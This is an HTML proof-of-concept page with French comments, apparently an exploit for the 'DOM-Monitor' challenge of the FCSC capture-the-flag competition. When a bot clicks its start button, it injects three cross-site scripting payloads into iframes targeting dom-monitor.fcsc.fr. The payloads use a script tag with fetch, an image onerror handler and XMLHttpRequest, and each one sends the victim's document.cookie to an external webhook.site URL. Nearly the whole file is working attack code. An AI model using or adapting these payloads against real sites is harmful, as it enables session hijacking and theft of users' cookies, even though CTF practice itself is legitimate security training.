<!doctype html>
<html>
<head>
  <title>DOM-Monitor FCSC PoC</title>
  <style>
    #output {
      white-space: pre;
      font-family: monospace;
    }
  </style>
</head>
<body>
  <button id="start">start</button>
  <div id="output"></div>

  <script>
    // Fonction pour ajouter des logs à notre page
    function log(msg, isError) {
      const output = document.getElementById("output");
      const line = document.createElement("div");
      line.textContent = msg;
      if (isError) line.style.color = "red";
      output.appendChild(line);
      console.log(msg);
    }

    (async function() {
      // Récupérer le port depuis le hash de l'URL
      const port = location.hash.slice(1);
      log("[+] Port DevTools détecté: " + port);
      
      // Le bot clique sur #start → notre code s'exécute
      document.getElementById("start").onclick = async function() {
        log("[+] Bouton start cliqué, lancement de l'exploit...");

        try {
          // Approche avec exfiltration via webhook.site
          log("[+] Création d'un iframe avec XSS vers dom-monitor.fcsc.fr...");
          
          // URL du webhook
          const webhookUrl = "https://webhook.site/b0481fed-9c26-4d29-a054-60ae0e3eae1d";
          
          // Méthode 1: Fetch API
          const fetchScript = "<script>fetch('" + webhookUrl + "?cookie=' + encodeURIComponent(document.cookie));" +
            "console.log('COOKIE ENVOYÉ: ' + document.cookie);</script>";
          
          const fetchPayload = encodeURIComponent(fetchScript);
          
          const iframe1 = document.createElement("iframe");
          iframe1.src = "https://dom-monitor.fcsc.fr/?content=" + fetchPayload;
          iframe1.style.display = "block";
          iframe1.style.width = "100%";
          iframe1.style.height = "200px";
          document.body.appendChild(iframe1);
          
          log("[+] Iframe avec fetch créé");
          
          // Méthode 2: Image
          const imgScript = "<img src='x' onerror=\"var img = new Image(); " +
            "img.src='" + webhookUrl + "?img-exfil=' + encodeURIComponent(document.cookie);\">";
            
          const imgPayload = encodeURIComponent(imgScript);
          
          const iframe2 = document.createElement("iframe");
          iframe2.src = "https://dom-monitor.fcsc.fr/?content=" + imgPayload;
          iframe2.style.display = "none";
          document.body.appendChild(iframe2);
          
          log("[+] Iframe avec image créé");
          
          // Méthode 3: XMLHttpRequest
          const xhrScript = "<script>var xhr = new XMLHttpRequest();" +
            "xhr.open('GET', '" + webhookUrl + "?xhr-exfil=' + encodeURIComponent(document.cookie), true);" +
            "xhr.send();</script>";
            
          const xhrPayload = encodeURIComponent(xhrScript);
          
          const iframe3 = document.createElement("iframe");
          iframe3.src = "https://dom-monitor.fcsc.fr/?content=" + xhrPayload;
          iframe3.style.display = "none";
          document.body.appendChild(iframe3);
          
          log("[+] Iframe avec XMLHttpRequest créé");
          
          // Attendre un peu
          await new Promise(resolve => setTimeout(resolve, 2000));
          log("[+] Exploit terminé, vérifiez votre webhook");
        } catch (e) {
          log("[!] Erreur: " + e.toString(), true);
        }
      };
    })();
  </script>
</body>
</html> 
